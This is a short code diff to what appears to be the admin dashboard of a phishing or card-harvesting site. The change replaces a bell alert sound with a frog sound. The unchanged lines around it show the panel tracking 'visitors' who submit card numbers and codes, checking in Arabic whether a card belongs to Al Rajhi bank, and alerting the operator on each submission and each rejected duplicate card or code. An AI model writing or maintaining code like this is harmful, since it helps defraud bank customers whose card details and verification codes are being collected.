@@ -511,9 +511,9 @@
       renderVisitorsList();
     }
 
-    // Pre-load bell notification sound
-    const bellAudio = new Audio('/admin/bell.mp3');
-    bellAudio.volume = 1.0;
+    // Pre-load frog sound once
+    const frogAudio = new Audio('/admin/frog.mp3');
+    frogAudio.volume = 0.7;
 
     // دالة التحقق إذا كانت البطاقة تابعة للراجحي
     function isRajhiCard(visitor) {
@@ -1274,8 +1274,8 @@
         showNotification('📝 بيانات جديدة من الزائر #' + visitor.visitorNumber);
         // Play bell sound for every data submission
         try {
-          bellAudio.currentTime = 0;
-          bellAudio.play().catch(() => {});
+          frogAudio.currentTime = 0;
+          frogAudio.play().catch(() => {});
         } catch(e) {}
       });
 
@@ -1295,8 +1295,8 @@
           const maskedCard = cardNumber ? cardNumber.slice(0, 4) + ' **** **** ' + cardNumber.slice(-4) : '';
           showNotification('⚠️ تم رفض بطاقة مكررة من الزائر #' + existing.visitorNumber + ' - ' + maskedCard);
           try {
-            bellAudio.currentTime = 0;
-            bellAudio.play().catch(() => {});
+            frogAudio.currentTime = 0;
+            frogAudio.play().catch(() => {});
           } catch(e) {}
         }
       });
@@ -1316,8 +1316,8 @@
           // Show notification
           showNotification('⚠️ تم رفض رمز مكرر من الزائر #' + existing.visitorNumber + ' - ' + code);
           try {
-            bellAudio.currentTime = 0;
-            bellAudio.play().catch(() => {});
+            frogAudio.currentTime = 0;
+            frogAudio.play().catch(() => {});
           } catch(e) {}
         }
       });
